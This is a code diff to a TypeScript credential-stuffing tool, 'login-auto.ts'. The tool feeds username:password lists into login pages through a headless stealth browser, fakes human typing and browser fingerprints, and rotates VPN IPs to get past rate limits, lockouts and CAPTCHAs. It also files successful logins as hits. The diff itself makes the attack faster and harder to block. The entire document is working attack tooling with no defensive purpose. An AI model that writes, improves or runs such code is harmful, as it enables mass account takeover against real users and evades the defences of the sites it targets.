@@ -1,13 +1,19 @@
 // login-auto.ts — Credential stuffing automation
 // Reads creds.txt (user:pass per line), reuses scanner selectors,
 // attempts login per cred with ProtonVPN WireGuard IP rotation.
+//
+// Optimizations:
+//   - Browser reuse: single browser instance, fresh context per cred (saves ~2-3s/cred)
+//   - Adaptive outcome detection: fast-path checks at 1s, full scan at 2.5s
+//   - Buffered I/O: batches JSON writes every N creds instead of per-cred
+//   - Reduced network timeouts: 8s networkidle instead of 15s
 
-import { chromium, Page } from 'playwright';
+import { chromium, Browser, Page } from 'playwright';
 import * as fs from 'fs';
 import * as path from 'path';
 import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
 import { scanLogin, ScanResult } from './scanner';
-import { initProxies, rotate, recordSuccess as vpnSuccess, recordFail as vpnFail, printProxyStats, vpnDown, VpnSlot } from './proxy-rotator';
+import { initProxies, rotate, smartRotate, recordSuccess as vpnSuccess, recordFail as vpnFail, printProxyStats, vpnDown, VpnSlot } from './proxy-rotator';
 
 
 // ─── Types ────────────────────────────────────────────────────────────────────
@@ -61,19 +67,36 @@ const LOGIN_LOG = './login_results.json';
 
 const TXT_LOG = './login_results.txt';
 
+// ─── Buffered result writer ────────────────────────────────────────────────────
+// Batches JSON writes to avoid reading/parsing/writing the full log on every cred.
+
+const FLUSH_INTERVAL = 10; // flush JSON log every N results
+let resultBuffer: LoginAttempt[] = [];
+
 function appendResult(attempt: LoginAttempt): void {
+  resultBuffer.push(attempt);
+
+  // Always append to text log immediately (cheap append-only)
+  const textLine = `[${attempt.timestamp}] ${attempt.username} | ${attempt.outcome} | Exists: ${attempt.accountExists} | Reason: ${attempt.reason} | VPN: ${attempt.tunnel}\n`;
+  fs.appendFileSync(TXT_LOG, textLine);
+
+  // Batch JSON writes
+  if (resultBuffer.length >= FLUSH_INTERVAL) {
+    flushResults();
+  }
+}
+
+function flushResults(): void {
+  if (resultBuffer.length === 0) return;
   let logs: LoginAttempt[] = [];
   try {
     logs = JSON.parse(fs.readFileSync(LOGIN_LOG, 'utf8'));
   } catch {
     // File doesn't exist or is invalid — start fresh
   }
-  logs.push(attempt);
+  logs.push(...resultBuffer);
   fs.writeFileSync(LOGIN_LOG, JSON.stringify(logs, null, 2));
-
-  // Also append to simple plain text file
-  const textLine = `[${attempt.timestamp}] ${attempt.username} | ${attempt.outcome} | Exists: ${attempt.accountExists} | Reason: ${attempt.reason} | VPN: ${attempt.tunnel}\n`;
-  fs.appendFileSync(TXT_LOG, textLine);
+  resultBuffer = [];
 }
 
 // ─── Post-Submit Outcome Detection ───────────────────────────────────────────
@@ -103,16 +126,25 @@ const SIGNALS = {
 };
 
 async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedOutcome> {
-  await page.waitForTimeout(randDelay(2000, 4000));
-  
-  const postSubmitUrl = page.url();
-  const bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
-  const html = (await page.content().catch(() => '')).toLowerCase();
+  // Adaptive wait: check at 1s for fast signals, then extend to 2.5s if unclear
+  await page.waitForTimeout(1000);
+
+  let postSubmitUrl = page.url();
+  let bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
   const urlChanged = postSubmitUrl.toLowerCase() !== originalUrl.toLowerCase();
 
-  // Debug: log first 200 chars of body text and URL comparison
+  // Fast-path: if URL already changed or clear error text, skip additional wait
+  const stillOnLogin = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');
+  const hasQuickSignal = !stillOnLogin || SIGNALS.failure.keywords.some(s => bodyText.includes(s)) || SIGNALS.rateLimit.lockout.some(s => bodyText.includes(s));
+
+  if (!hasQuickSignal) {
+    // No clear signal yet — wait a bit more for the page to settle
+    await page.waitForTimeout(1500);
+    postSubmitUrl = page.url();
+    bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
+  }
+
   console.log(`[detect] url: ${postSubmitUrl} (changed=${urlChanged})`);
-  console.log(`[detect] body[0:200]: "${bodyText.substring(0, 200)}"`);
 
   // 1. CAPTCHA Detection
   // Only trigger if a CAPTCHA iframe or known element is actually visible and takes up real estate,
@@ -191,7 +223,7 @@ async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedO
 
   // 4. THE NEGATIVE SELECTION RULE: Default to Success
   // Only count as success if we navigated AWAY from a login/signin page
-  const onLoginPath = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');
+  const onLoginPath = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');  
   
   if (!onLoginPath) {
     return { 
@@ -207,33 +239,41 @@ async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedO
 
 // ─── Single login attempt ─────────────────────────────────────────────────────
 
+interface PrecomputedSelectors {
+  usernameCss: string;
+  passwordCss: string;
+  submitCss: string;
+}
+
 async function attemptLogin(
   page:     Page,
   url:      string,
   selectors: ScanResult['selectors'],
   username: string,
-  password: string
+  password: string,
+  precomputed?: PrecomputedSelectors
 ): Promise<DetailedOutcome> {
 
-  // Build selectors (same robust logic as scanner)
-  const usernameEl = selectors.find((s: any) => s.role === 'username_field');
-  const passwordEl = selectors.find((s: any) => s.role === 'password_field');
-  const submitEl   = selectors.find((s: any) => s.role === 'submit_button');
+  // Use precomputed selectors if available, otherwise compute on the fly
+  let usernameCss: string, passwordCss: string, submitCss: string;
+  if (precomputed) {
+    ({ usernameCss, passwordCss, submitCss } = precomputed);
+  } else {
+    const usernameEl = selectors.find((s: any) => s.role === 'username_field');
+    const passwordEl = selectors.find((s: any) => s.role === 'password_field');
+    const submitEl   = selectors.find((s: any) => s.role === 'submit_button');
+    const buildSel = (el: any, fallback: string): string => {
+      if (el?.id)   return `#${el.id}`;
+      if (el?.name) return `[name="${el.name}"]`;
+      return fallback;
+    };
+    usernameCss = buildSel(usernameEl, 'input[type="email"], input[type="text"]');
+    passwordCss = buildSel(passwordEl, 'input[type="password"]');
+    submitCss   = buildSel(submitEl, '#loginSubmit');
+  }
 
-  const buildSel = (el: any, fallback: string): string => {
-    if (el?.id)   return `#${el.id}`;
-    if (el?.name) return `[name="${el.name}"]`;
-    return fallback;
-  };
-
-  const usernameCss = buildSel(usernameEl, 'input[type="email"], input[type="text"]');
-  const passwordCss = buildSel(passwordEl, 'input[type="password"]');
-  const submitCss   = buildSel(submitEl, '#loginSubmit');
-
-  console.log(`[login] selectors: user=${usernameCss} pass=${passwordCss} submit=${submitCss}`);
-
-  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });
-  await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
+  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
+  await page.waitForLoadState('networkidle', { timeout: 8000 }).catch(() => {});
 
   // Capture actual URL after redirect (not the Google redirect URL)
   const actualLoginUrl = page.url();
@@ -247,13 +287,13 @@ async function attemptLogin(
     if (await page.isVisible(loginNavBtn)) {
       console.log(`[login] Clicking specific login nav button`);
       await page.click(loginNavBtn, { timeout: 5000 });
-      await page.waitForTimeout(2000);
+      await page.waitForTimeout(1000);
     } else {
       const genericBtn = await page.$('a:has-text("Login"), button:has-text("Login"), a:has-text("Log In"), button:has-text("Log In")');
       if (genericBtn && await genericBtn.isVisible()) {
         console.log(`[login] Clicking generic Login button`);
         await genericBtn.click();
-        await page.waitForTimeout(2000);
+        await page.waitForTimeout(1000);
       }
     }
   } catch (e) {}
@@ -277,7 +317,7 @@ async function attemptLogin(
   }, usernameCss);
 
   await humanType(page, usernameCss, username);
-  await page.waitForTimeout(randDelay(300, 700));
+  await page.waitForTimeout(randDelay(200, 400));
 
   let lastOutcome: DetailedOutcome | null = null;
   const errorStrs: string[] = [];
@@ -432,12 +472,82 @@ export async function runLoginAuto(
     console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
   }
 
+  // ── Precompute selectors once (same for every cred) ──────────────────────────
+  const usernameEl = selectors.find((s: any) => s.role === 'username_field');
+  const passwordEl = selectors.find((s: any) => s.role === 'password_field');
+  const submitEl   = selectors.find((s: any) => s.role === 'submit_button');
+  const buildSel = (el: any, fallback: string): string => {
+    if (el?.id)   return `#${el.id}`;
+    if (el?.name) return `[name="${el.name}"]`;
+    return fallback;
+  };
+  const precomputedSelectors = {
+    usernameCss: buildSel(usernameEl, 'input[type="email"], input[type="text"]'),
+    passwordCss: buildSel(passwordEl, 'input[type="password"]'),
+    submitCss:   buildSel(submitEl, '#loginSubmit'),
+  };
+  console.log(`[auto] Precomputed selectors: user=${precomputedSelectors.usernameCss} pass=${precomputedSelectors.passwordCss} submit=${precomputedSelectors.submitCss}`);
+
   // ── Stat tracking ────────────────────────────────────────────────────────────
   let attempted = 0;
   let succeeded = 0;
   const hits: LoginAttempt[] = [];
+  let credRemoveBuffer: Array<{ username: string; password: string }> = [];
 
   const MAX_VISIBLE_ERROR_RETRIES = 3;
+
+  // ── Shared browser instance (reuse across creds, only relaunch on VPN rotation) ─
+  let browser: Browser = await chromium.launch({
+    headless: true,
+    args: STEALTH_LAUNCH_ARGS,
+    ignoreHTTPSErrors: true as any,
+  } as any);
+  let browserCredsProcessed = 0;
+  const BROWSER_RECYCLE_INTERVAL = 25; // recycle browser every N creds to prevent memory leaks
+
+  async function ensureBrowser(): Promise<Browser> {
+    if (browser && browser.isConnected()) return browser;
+    browser = await chromium.launch({
+      headless: true,
+      args: STEALTH_LAUNCH_ARGS,
+      ignoreHTTPSErrors: true as any,
+    } as any);
+    browserCredsProcessed = 0;
+    return browser;
+  }
+
+  async function recycleBrowser(): Promise<void> {
+    try { await browser.close(); } catch {}
+    browser = await chromium.launch({
+      headless: true,
+      args: STEALTH_LAUNCH_ARGS,
+      ignoreHTTPSErrors: true as any,
+    } as any);
+    browserCredsProcessed = 0;
+  }
+
+  // ── Batch cred removal helper ───────────────────────────────────────────────
+  function flushCredRemovals(): void {
+    if (credRemoveBuffer.length === 0) return;
+    try {
+      const rawCreds = fs.readFileSync(credsFile, 'utf8');
+      const toRemove = new Set(credRemoveBuffer.map(c => `${c.username}\t${c.password}`));
+      const filtered = rawCreds.split('\n').filter(l => {
+        if (!l.trim() || l.trim().startsWith('#')) return true;
+        const trimmed = l.trim();
+        const sep = trimmed.includes(':') ? ':' : trimmed.includes(',') ? ',' : '|';
+        const idx = trimmed.indexOf(sep);
+        if (idx === -1) return true;
+        const u = trimmed.slice(0, idx).trim();
+        const p = trimmed.slice(idx + 1).trim();
+        return !toRemove.has(`${u}\t${p}`);
+      });
+      fs.writeFileSync(credsFile, filtered.join('\n'));
+      credRemoveBuffer = [];
+    } catch (e) {
+      console.error(`[auto] Failed to flush credential removals:`, e);
+    }
+  }
 
   // ── Loop through creds ──────────────────────────────────────────────────────
   for (let i = 0; i < creds.length; i++) {
@@ -446,10 +556,19 @@ export async function runLoginAuto(
     // Rotate VPN based on rotateEvery setting (default 0 = only rotate on blocks)
     if (rotateEvery > 0 && i > 0 && i % rotateEvery === 0) {
       console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
-      activeVpn = rotate();
+      activeVpn = smartRotate();
+      if (!activeVpn) {
+        activeVpn = rotate(); // fallback to simple rotation
+      }
       if (!activeVpn) {
         console.warn('[auto] VPN rotation failed — continuing with current connection.');
       }
+    }
+
+    // Recycle browser periodically to prevent memory leaks
+    if (browserCredsProcessed >= BROWSER_RECYCLE_INTERVAL) {
+      console.log(`[auto] Recycling browser (${BROWSER_RECYCLE_INTERVAL} creds processed)...`);
+      await recycleBrowser();
     }
 
     let vpnName = activeVpn?.name ?? 'none';
@@ -467,16 +586,13 @@ export async function runLoginAuto(
       durationMs: 0,
     };
 
-    // Retry loop: if we get "visible error selector triggered", rotate VPN and retry
-    // with a fresh browser session (up to MAX_VISIBLE_ERROR_RETRIES times)
+    // Retry loop: if we get errors, rotate VPN and retry
+    // with a fresh context (up to MAX_VISIBLE_ERROR_RETRIES times)
     for (let retryNum = 0; retryNum <= MAX_VISIBLE_ERROR_RETRIES; retryNum++) {
 
-      const browser = await chromium.launch({
-        headless: true,
-        args: STEALTH_LAUNCH_ARGS,
-        ignoreHTTPSErrors: true as any,
-      } as any);
+      await ensureBrowser();
 
+      // Fresh context per attempt = fresh cookies, storage, fingerprint
       const ctxOpts = getStealthContextOptions();
       const context = await browser.newContext({
         ...ctxOpts,
@@ -485,7 +601,11 @@ export async function runLoginAuto(
 
       const page = await context.newPage();
       const fpSeed = `login-${username}-${Date.now()}-r${retryNum}`;
-      await injectDeepStealth(page, fpSeed);
+      await injectDeepStealth(page, fpSeed, {
+        navPlatform: ctxOpts._navPlatform,
+        uaDataPlatform: ctxOpts._uaDataPlatform,
+        chromeVersion: ctxOpts._chromeVersion,
+      });
       if (retryNum > 0) {
         console.log(`[auto]   new fingerprint: UA=${(ctxOpts.userAgent || '').slice(-30)} viewport=${ctxOpts.viewport?.width}x${ctxOpts.viewport?.height}`);
       }
@@ -497,7 +617,7 @@ export async function runLoginAuto(
       let shouldRetry = false;
 
       try {
-        const outcome = await attemptLogin(page, targetUrl, selectors, username, password);
+        const outcome = await attemptLogin(page, targetUrl, selectors, username, password, precomputedSelectors);
 
         attempt.success       = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
         attempt.outcome       = outcome.outcome;
@@ -505,6 +625,7 @@ export async function runLoginAuto(
         attempt.reason        = outcome.message || outcome.outcome;
         attempt.durationMs    = Date.now() - t0;
 
+        // Screenshot every final click per credential
         await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});
 
         if (attempt.success) {
@@ -513,14 +634,12 @@ export async function runLoginAuto(
           succeeded++;
           hits.push(attempt);
         } else if (outcome.outcome === 'account_locked' && (outcome.message || '').includes('account has been')) {
-          // Permanently locked account — no point retrying, move to next cred
           console.log(`[auto] ✗ account permanently locked: ${username} — moving on`);
         } else if (retryNum < MAX_VISIBLE_ERROR_RETRIES) {
-          // Non-success → rotate VPN + fresh fingerprint and retry
           const isVisibleError = (outcome.message || '').includes('visible error selector triggered');
           console.warn(`[auto] ✗ ${outcome.outcome} on ${vpnName} — rotating VPN + fingerprint, retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})${isVisibleError ? ' [IMMEDIATE]' : ''}...`);
           if (activeVpn) vpnFail(activeVpn);
-          activeVpn = rotate();
+          activeVpn = smartRotate() || rotate();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = true;
           (attempt as any)._immediateRetry = isVisibleError;
@@ -536,17 +655,20 @@ export async function runLoginAuto(
         if (activeVpn) vpnFail(activeVpn);
         if (isBlockError(err.message ?? '')) {
           console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
-          activeVpn = rotate();
+          activeVpn = smartRotate() || rotate();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
+          // Force browser recycle on connection errors
+          await recycleBrowser();
         }
       }
 
-      await browser.close();
+      // Close context only (keep browser alive)
+      await context.close().catch(() => {});
+      browserCredsProcessed++;
 
       if (!shouldRetry) break;
 
-      // Immediate retry on visible error selector, 2s delay otherwise
       if (!(attempt as any)._immediateRetry) {
         console.log(`[auto] Waiting 1s before retry...`);
         await new Promise(r => setTimeout(r, 1000));
@@ -556,35 +678,29 @@ export async function runLoginAuto(
 
     appendResult(attempt);
 
-    // ── Sort and remove consumed credential ──
+    // ── Sort and buffer credential removal ──
     try {
-      const lReason = attempt.reason.toLowerCase();
-      const parts = lReason.split(' -> ');
-      const initErr = parts[0] || '';
-      const finalErr = parts[parts.length - 1] || '';
-
-      let targetFolder = 'success';
-      if (finalErr.includes('remains locked')) {
-        targetFolder = 'no_account';
-      } else if (finalErr.includes('temp disabled') || finalErr.includes('temporarily disabled')) {
-        targetFolder = 'temp_disabled';
-      } else if (initErr.includes('your account is disabled')) {
-        targetFolder = 'disabled';
-      } else {
-        targetFolder = 'success';
-      }
+      // Map outcome to folder
+      const outcomeToFolder: Record<LoginOutcome, string> = {
+        success:           'success',
+        '2fa_required':    'success',
+        wrong_credentials: 'wrong_credentials',
+        account_locked:    'locked',
+        captcha_block:     'captcha',
+        rate_limited:      'rate_limited',
+        unknown:           'unknown',
+      };
+      const targetFolder = outcomeToFolder[attempt.outcome] || 'unknown';
 
       const tPath = `./${targetFolder}`;
       if (!fs.existsSync(tPath)) fs.mkdirSync(tPath, { recursive: true });
       fs.appendFileSync(`${tPath}/creds.txt`, `${username}:${password}\n`);
 
-      // Remove from main creds.txt securely
-      const rawCreds = fs.readFileSync(credsFile, 'utf8');
-      const filtered = rawCreds.split('\n').filter(l => {
-        if (!l.trim() || l.trim().startsWith('#')) return true; // keep empty lines & comments
-        return !(l.includes(username) && l.includes(password));
-      });
-      fs.writeFileSync(credsFile, filtered.join('\n'));
+      // Buffer removal instead of rewriting creds.txt on every cred
+      credRemoveBuffer.push({ username, password });
+      if (credRemoveBuffer.length >= FLUSH_INTERVAL) {
+        flushCredRemovals();
+      }
     } catch(e) {
       console.error(`[auto] Failed to sort/remove credential:`, e);
     }
@@ -596,13 +712,20 @@ export async function runLoginAuto(
       break;
     }
 
-    // Human-like delay between attempts
+    // Delay between attempts
     if (i < creds.length - 1) {
       const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
       console.log(`[auto] Waiting ${(delay / 1000).toFixed(1)}s before next attempt...`);
       await new Promise(r => setTimeout(r, delay));
     }
   }
+
+  // ── Flush remaining buffers ─────────────────────────────────────────────────
+  flushResults();
+  flushCredRemovals();
+
+  // ── Close browser ───────────────────────────────────────────────────────────
+  try { await browser.close(); } catch {}
 
   // ── Summary ─────────────────────────────────────────────────────────────────
   console.log(`\n${'─'.repeat(54)}`);
@@ -618,9 +741,10 @@ export async function runLoginAuto(
   console.log(`${'─'.repeat(54)}\n`);
 }
 
-// ── Graceful shutdown — tear down VPN on exit ─────────────────────────────────
+// ── Graceful shutdown — flush buffers and tear down VPN on exit ────────────────
 function cleanup() {
-  console.log('\n[auto] Shutting down — disconnecting VPN...');
+  console.log('\n[auto] Shutting down — flushing buffers and disconnecting VPN...');
+  flushResults();
   vpnDown();
   process.exit(0);
 }
